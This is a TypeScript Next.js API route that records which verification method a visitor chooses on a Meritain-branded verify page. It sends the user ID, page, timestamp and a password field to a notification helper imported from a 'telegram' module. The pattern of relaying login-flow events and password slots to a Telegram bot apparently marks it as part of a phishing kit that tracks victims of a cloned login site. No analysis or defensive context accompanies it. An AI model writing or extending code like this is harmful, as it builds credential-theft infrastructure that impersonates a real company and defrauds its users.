import { NextRequest, NextResponse } from "next/server"

import { MERITAIN_VERIFY_PATH } from "@/lib/meritain-paths"
import { sendFormNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const body = (await request.json()) as {
      type?: string
      verificationType?: string
      method?: string
      userId?: string
      page?: string
    }

    if (body.type === "login_back_to_verification_methods") {
      await sendFormNotification({
        type: "login_back_to_verification_methods",
        userId: body.userId ?? "",
        timestamp: new Date().toISOString(),
        page: body.page ?? MERITAIN_VERIFY_PATH,
      })
      return NextResponse.json({ success: true })
    }

    const verificationType = String(body.verificationType ?? body.method ?? body.type ?? "Unknown")
    const lower = verificationType.toLowerCase()
    const type =
      lower.includes("email") ? "email_verification" : "text_verification"
    await sendFormNotification({
      type,
      userId: body.userId ?? "",
      password: "",
      timestamp: new Date().toISOString(),
      page: body.page ?? MERITAIN_VERIFY_PATH,
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending verification click notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
